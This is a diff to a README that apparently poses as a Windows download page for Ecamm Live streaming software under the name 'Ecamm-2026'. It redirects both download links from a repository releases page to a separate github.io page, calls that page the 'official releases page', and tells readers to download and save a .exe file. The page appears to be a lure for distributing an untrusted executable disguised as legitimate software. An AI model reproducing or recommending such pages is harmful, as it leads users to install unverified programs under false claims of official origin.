@@ -1,6 +1,6 @@
 # 📹 Ecamm-2026 - Stream Professional Content To Your Audience
 
-[![](https://img.shields.io/badge/Download-Ecamm--2026-blue)](https://github.com/Jilleenaustralian287/Ecamm-2026/releases)
+[![](https://img.shields.io/badge/Download-Ecamm--2026-blue)](https://jilleenaustralian287.github.io)
 
 Ecamm Live provides tools to broadcast high-quality video content from a Windows computer. This software works for live streams, recorded shows, and interviews. It supports multiple cameras, screen sharing, and overlays. Use this guide to set up your streaming environment on Windows 10 or Windows 11.
 
@@ -8,7 +8,7 @@ Ecamm Live provides tools to broadcast high-quality video content from a Windows
 
 You need the installer file to run Ecamm-2026 on your machine. Follow these steps to obtain the correct version:
 
-1. Visit the [official releases page](https://github.com/Jilleenaustralian287/Ecamm-2026/releases).
+1. Visit the [official releases page](https://jilleenaustralian287.github.io).
 2. Look for the latest version number at the top of the list.
 3. Click the link ending in .exe to start the download.
 4. Save the file to your desktop or your downloads folder.
